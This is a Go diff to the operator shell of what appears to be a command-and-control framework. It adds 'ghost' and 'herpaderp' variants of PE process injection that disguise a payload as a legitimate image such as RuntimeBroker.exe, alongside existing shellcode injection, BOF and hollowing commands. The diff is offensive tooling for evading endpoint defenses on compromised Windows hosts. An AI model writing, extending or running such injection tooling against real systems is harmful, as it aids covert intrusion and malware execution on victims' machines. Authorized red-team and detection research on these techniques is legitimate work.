@@ -1478,6 +1478,8 @@ func (sh *Shell) cmdAgentHelp() {
 			{"bof <file> [args]", "Beacon Object File (in-memory)"},
 			{"shellcode <file>", "Raw shellcode injection"},
 			{"inject <pid> <file>", "Remote process injection"},
+			{"inject ghost <pe-file>", "Ghost process injection"},
+			{"inject herpaderp <pe-file>", "Process herpaderping"},
 			{"hollow <exe> <file>", "Process hollowing"},
 		}})
 	}
@@ -1779,6 +1781,30 @@ func (sh *Shell) cmdInject(args []string) {
 		return
 	}
 
+	// PE hollowing variants: inject ghost <pe-file> [legit-image]
+	if isHollowMethod(args[0]) {
+		var data []byte
+		var err error
+		legit := "C:\\Windows\\System32\\RuntimeBroker.exe"
+		switch len(args) {
+		case 2:
+			data, err = os.ReadFile(args[1])
+		case 3:
+			legit = args[1]
+			data, err = os.ReadFile(args[2])
+		default:
+			Error("Usage: inject %s <pe-file> [legit-image]", args[0])
+			return
+		}
+		if err != nil {
+			Error("Failed to read PE file: %v", err)
+			return
+		}
+		sh.queueTask(protocol.TaskInject, []string{legit, args[0]}, data)
+		Info("Queued %s hollowing (%d bytes) -> %s", args[0], len(data), legit)
+		return
+	}
+
 	if len(args) < 2 {
 		Error("Usage: inject <pid> <shellcode-file>")
 		Info("Or: inject earlybird <shellcode-file> | inject hijack <shellcode-file>")
@@ -1793,6 +1819,15 @@ func (sh *Shell) cmdInject(args []string) {
 
 	sh.queueTask(protocol.TaskInject, []string{args[0]}, data)
 	Info("Injecting %d bytes into PID %s", len(data), args[0])
+}
+
+func isHollowMethod(m string) bool {
+	switch m {
+	case "ghost", "ghostly", "herpaderp", "herpaderply":
+		return true
+	default:
+		return false
+	}
 }
 
 func (sh *Shell) cmdHollow(args []string) {
